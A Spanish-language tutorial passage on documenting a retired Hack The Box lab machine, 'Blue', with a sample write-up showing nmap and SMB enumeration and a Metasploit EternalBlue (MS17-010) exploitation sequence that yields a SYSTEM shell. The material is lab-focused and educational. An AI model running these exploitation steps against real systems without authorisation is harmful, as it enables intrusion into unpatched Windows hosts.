## FASE 9: TU PRIMER LABORATORIO — FLUJO COMPLETO

### ¿Qué vamos a hacer?

Vamos a simular que acabas de resolver una máquina retirada de Hack The Box llamada **"Blue"** (es un ejemplo clásico, máquina Windows fácil y retirada). Te voy a dar:

1. Cómo crear la estructura de carpetas.
2. Cómo usar la plantilla de writeup.
3. Cómo documentar paso a paso.
4. Cómo verificar seguridad antes del commit.
5. Cómo subirlo a GitHub.

---

## PASO 1: Verificar que la máquina está retirada

Antes de documentar cualquier máquina de HTB:

1. Entra a [app.hackthebox.com](https://app.hackthebox.com).
2. Busca la máquina.
3. Verifica que dice **"Retired"**.
4. Si dice **"Active"**, NO la documentes todavía.

Para este ejemplo, "Blue" es una máquina retirada (Windows, fácil, EternalBlue).

---

## PASO 2: Crear la estructura de carpetas

```bash
cd ~/Documentos/Portaforio/L4R77.github.io

# Crear carpeta para la máquina
mkdir -p ctf-writeups/hackthebox/machines/blue/screenshots

# Crear carpeta para notas personales
mkdir -p ctf-writeups/hackthebox/machines/blue/notas
```

Estructura que deberías ver:

```
ctf-writeups/hackthebox/machines/blue/
├── screenshots/
├── notas/
└── README.md  (lo crearemos ahora)
```

---

## PASO 3: Crear el README.md usando la plantilla

```bash
# Copiar la plantilla
cp ctf-writeups/templates/plantilla-writeup.md ctf-writeups/hackthebox/machines/blue/README.md

# Editar el writeup
nano ctf-writeups/hackthebox/machines/blue/README.md
```

---

## PASO 4: Ejemplo de writeup completo

Aquí tienes un ejemplo de cómo debería quedar tu `README.md` para la máquina "Blue":

```markdown
# Blue

- **Plataforma:** Hack The Box
- **Estado:** ⚠️ Retirada
- **Dificultad:** Fácil
- **Categoría:** Windows
- **IP (laboratorio):** 10.10.10.40
- **Fecha:** 2024-01-15

---

## ⚠️ Cumplimiento de Plataforma

- **HTB:** Esta máquina estaba **retirada** al momento de escribir este writeup.
- **No se publican spoilers de máquinas activas.**

---

## Resumen

Blue es una máquina Windows que explota la vulnerabilidad
EternalBlue (MS17-010) para obtener acceso inicial y luego
realizar escalada de privilegios mediante técnicas de
Windows.

**Objetivos de aprendizaje:**
- Enumeración de SMB.
- Explotación de EternalBlue con Metasploit.
- Escalada de privilegios en Windows.

---

## Reconocimiento

### Escaneo Nmap

```bash
# Escaneo inicial de puertos
nmap -sC -sV -oN nmap/inicial 10.10.10.40
```

**Puertos abiertos encontrados:**
- Puerto 135 — MSRPC
- Puerto 139 — NetBIOS-SSN
- Puerto 445 — SMB (Microsoft-DS)
- Puerto 49152-49157 — RPC adicionales

### ¿Qué aprendimos del escaneo?

La máquina tiene múltiples puertos abiertos típicos de Windows,
incluyendo SMB en el puerto 445. Esto sugiere que podría ser
vulnerable a EternalBlue.

---

## Enumeración

### SMB

```bash
# Enumerar shares SMB
smbclient -L //10.10.10.40 -N

# Intentar conexión anónima
smbclient //10.10.10.40/Users -N
```

**Hallazgos:**
- SMB permite listar recursos compartidos.
- Se encontraron los shares: `ADMIN$`, `C$`, `IPC$`, `Share`, `Users`.

### Verificación de EternalBlue

```bash
# Script de Nmap para detectar MS17-010
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40
```

**Hallazgos:**
- La máquina es vulnerable a MS17-010 (EternalBlue).

---

## Acceso Inicial / Explotación

### Vulnerabilidad Identificada

MS17-010 (EternalBlue) — vulnerabilidad en el protocolo SMBv1
que permite ejecución remota de código.

### Pasos de Explotación

```bash
# Iniciar Metasploit
msfconsole

# Seleccionar el exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar opciones
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set LPORT 4444

# Ejecutar
run
```

**Resultado:** Shell obtenida como `NT AUTHORITY\SYSTEM`.

---

## Flag de Usuario

Como obtuvimos acceso SYSTEM directamente, podemos leer ambas flags.

```
Ruta de la flag: C:\Users\Administrator\Desktop\root.txt
Ruta de la flag: C:\Users\haris\Desktop\user.txt
```

---

## Escalada de Privilegios

No fue necesaria. EternalBlue proporciona acceso SYSTEM directamente.

Si se hubiera obtenido como usuario normal, las técnicas a considerar serían:

```bash
# Enumerar privilegios
whoami /priv

# Buscar binarios con permisos especiales
icacls "C:\Program Files\*"
```

---

## Flag de Root

```
Ruta de la flag: C:\Users\Administrator\Desktop\root.txt
```

---

## Lecciones Aprendidas

- EternalBlue sigue siendo una vulnerabilidad crítica en sistemas sin parchear.
- La enumeración de SMB es fundamental en máquinas Windows.
- Metasploit simplifica la explotación, pero es importante entender el exploit subyacente.
- Siempre verificar si la máquina está retirada antes de publicar.

---

## Herramientas Utilizadas

| Herramienta | Propósito |
|---|---|
| Nmap | Escaneo de puertos y detección de vulnerabilidades |
| smbclient | Enumeración de recursos SMB |
| Metasploit | Framework de explotación |
| EternalBlue (MS17-010) | Exploit para SMBv1 |

---

## Comandos Útiles Aprendidos

```bash
# Detectar MS17-010 con Nmap
nmap --script smb-vuln-ms17-010 -p 445 [IP]

# Listar shares SMB
smbclient -L //[IP] -N

# Conectarse a un share SMB
smbclient //[IP]/[SHARE] -N
```

---

## Referencias

- [Microsoft MS17-010 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [EternalBlue Exploit en Rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
- [Hack The Box — Reglas de Writeups](https://help.hackthebox.com/en/articles/5185158-writeups)
```

---
